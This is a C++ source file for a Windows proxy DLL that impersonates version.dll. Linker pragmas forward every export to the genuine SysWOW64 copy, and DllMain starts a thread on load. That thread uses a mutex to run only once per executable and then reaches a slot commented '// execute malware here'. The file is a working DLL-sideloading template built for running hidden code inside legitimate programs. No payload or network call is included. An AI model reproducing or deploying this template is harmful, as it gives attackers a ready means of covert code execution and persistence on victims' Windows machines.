#include "pch.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(linker, "/export:GetFileVersionInfoA=\"C:\\Windows\\SysWOW64\\version.GetFileVersionInfoA\"")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=\"C:\\Windows\\SysWOW64\\version.GetFileVersionInfoByHandle\"")
#pragma comment(linker, "/export:GetFileVersionInfoExW=\"C:\\Windows\\SysWOW64\\version.GetFileVersionInfoExW\"")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=\"C:\\Windows\\SysWOW64\\version.GetFileVersionInfoSizeA\"")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=\"C:\\Windows\\SysWOW64\\version.GetFileVersionInfoSizeW\"")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=\"C:\\Windows\\SysWOW64\\version.GetFileVersionInfoSizeExW\"")
#pragma comment(linker, "/export:GetFileVersionInfoW=\"C:\\Windows\\SysWOW64\\version.GetFileVersionInfoW\"")
#pragma comment(linker, "/export:VerFindFileA=\"C:\\Windows\\SysWOW64\\version.VerFindFileA\"")
#pragma comment(linker, "/export:VerFindFileW=\"C:\\Windows\\SysWOW64\\version.VerFindFileW\"")
#pragma comment(linker, "/export:VerInstallFileA=\"C:\\Windows\\SysWOW64\\version.VerInstallFileA\"")
#pragma comment(linker, "/export:VerInstallFileW=\"C:\\Windows\\SysWOW64\\version.VerInstallFileW\"")
#pragma comment(linker, "/export:VerLanguageNameA=\"C:\\Windows\\SysWOW64\\version.VerLanguageNameA\"")
#pragma comment(linker, "/export:VerLanguageNameW=\"C:\\Windows\\SysWOW64\\version.VerLanguageNameW\"")
#pragma comment(linker, "/export:VerQueryValueA=\"C:\\Windows\\SysWOW64\\version.VerQueryValueA\"")
#pragma comment(linker, "/export:VerQueryValueW=\"C:\\Windows\\SysWOW64\\version.VerQueryValueW\"")

BOOL isRunning()
{
    TCHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    char fileNam[MAX_PATH];
    size_t i;
    wcstombs_s(&i, fileNam, szFileName, MAX_PATH);
    char* fileName = strrchr(fileNam, '\\') + 1;

    HANDLE h = CreateMutexA(NULL, TRUE, (LPCSTR)fileName);

    if (h)
    {
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            return TRUE;
        }
    }
    else {
        return TRUE;
    }
    return FALSE;
}

void run()
{
    if (!isRunning()) {
        // execute malware here
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
       CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run, 0, 0, NULL);
    }

    return TRUE;
}

